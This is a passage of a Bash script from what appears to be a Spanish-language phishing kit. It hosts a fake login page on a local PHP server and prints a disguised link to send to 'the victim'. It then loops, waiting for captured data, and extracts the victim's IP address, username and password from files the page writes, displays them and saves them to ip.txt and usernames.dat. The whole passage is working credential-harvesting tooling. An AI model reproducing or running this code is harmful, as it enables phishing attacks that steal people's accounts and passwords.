printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Envia este link a la victima :\e[0m\e[1;93m %s \n" $mask@$linker21
datafound

}


start_localhost() {

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
sleep 2
banner
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Alojado con éxito en :\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"
datafound

}

grab_ip() {

ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'

printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m IP de la victima:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Guardada en :\e[0m\e[1;93m ip.txt\e[0m\n"
printf "\n"
cat .htr/www/ip.txt >> ip.txt

}

grab_creds() {

account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Cuenta:\e[0m\e[1;96m %s\n\e[0m" $account
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Contraseña:\e[0m\e[1;96m %s\n\e[0m" $password
cat .htr/www/usernames.txt >> usernames.dat
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;96m Guardado en:\e[0m\e[1;93m usernames.dat\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Esperando la información de inicio de sesión, Usa \e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"

}

datafound() {

printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Esperando la información de inicio de sesión, Usa \e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do

if [[ -e ".htr/www/ip.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m IP de la victima ! \e[0m\n"
grab_ip
rm -rf .htr/www/ip.txt
fi
sleep 0.75
if [[ -e ".htr/www/usernames.txt" ]]; then
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;92m Informacion encontrada !! \e[0m\n"
grab_creds
rm -rf .htr/www/usernames.txt
fi
sleep 0.75
done 

}


banner
reqs
menu